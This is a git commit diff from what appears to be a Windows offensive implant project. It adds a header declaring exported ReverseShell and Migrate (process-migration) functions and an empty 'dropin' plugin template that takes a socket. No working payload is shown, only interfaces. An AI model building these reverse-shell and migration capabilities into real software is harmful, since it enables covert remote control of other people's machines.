ee5df869e0f50b81031fce0dc3feda66b61ffbd7
floomby <caboodlennm@gmail.com>
2014-03-23 15:30:51 -0600

    started the dropin manager

--- core/external.h
+++ core/external.h
@@ -2,13 +2,18 @@
 #define EXTERNAL_H_INCLUDED
 
 #include <cstdint>
+#include <windows.h>
 
 extern "C" __declspec(dllexport) void ReverseShell(const char *server, const char *port);
 extern "C" __declspec(dllexport) void Migrate(uint32_t pid);
 
 struct DllMeta_ {
-    void *where;
+    void   *where;
     size_t size;
+    struct {
+        SOCKET   sock;
+        uint32_t pid;
+    } next;
 };
 
 #endif//EXTERNAL_H_INCLUDED
---
+++ tools/templates/dropin.cpp
@@ -0,0 +1,13 @@
+// This file was created by the dropin manager
+// You still need to add the meat to your function
+
+#include <windows.h>
+
+extern "C" __declspec(dllexport) void NAME(SOCKET sock, const char *arg)
+{
+
+
+
+}
+
+
